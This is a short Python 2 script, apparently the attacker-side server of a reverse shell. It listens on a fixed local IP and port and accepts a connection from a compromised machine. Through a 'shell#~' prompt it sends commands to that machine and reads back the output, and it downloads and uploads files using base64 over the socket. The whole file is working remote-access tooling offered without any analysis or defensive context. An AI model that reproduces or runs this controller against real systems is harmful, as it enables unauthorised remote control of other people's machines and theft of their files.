#!/usr/bin/python

import socket
import json
import base64


def send_data(data):
	json_data = json.dumps(data)
	target.send(json_data)

def recv_data():
	data=""
	while True:
		try:
			data = data + target.recv(1024)
			return json.loads(data)
		except ValueError:
			continue


def shell():
	while True:
		cmd = raw_input("+ shell#~%s" %str(ip))
		send_data(cmd)
		if cmd=='q':
			break;
		elif cmd[:2]=="cd" and len(cmd)>3:
			continue
		elif cmd[:8]=="download":
			with open(cmd[9:],"wb") as file:
				file_data = recv_data()
				file.write(base64.b64decode(file_data))
		elif cmd[:6]=="upload":
			try:
				with open(cmd[7:],"rb") as fin:
					send_data(base64.b64encode(fin.read()))
			except:
				fail = "Upload Failed!"
				send_data(base64.b64encode(fail))
		else:
			res = recv_data()
			print(res)


def server():
	global sock
	global ip
	global target

	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

	sock.bind(("192.168.43.26",54321))
	sock.listen(5)

	print("[+] Listening")

	target,ip = sock.accept()

	print("[+] Connection Established from: %s" %str(ip))


server()
shell()
sock.close()
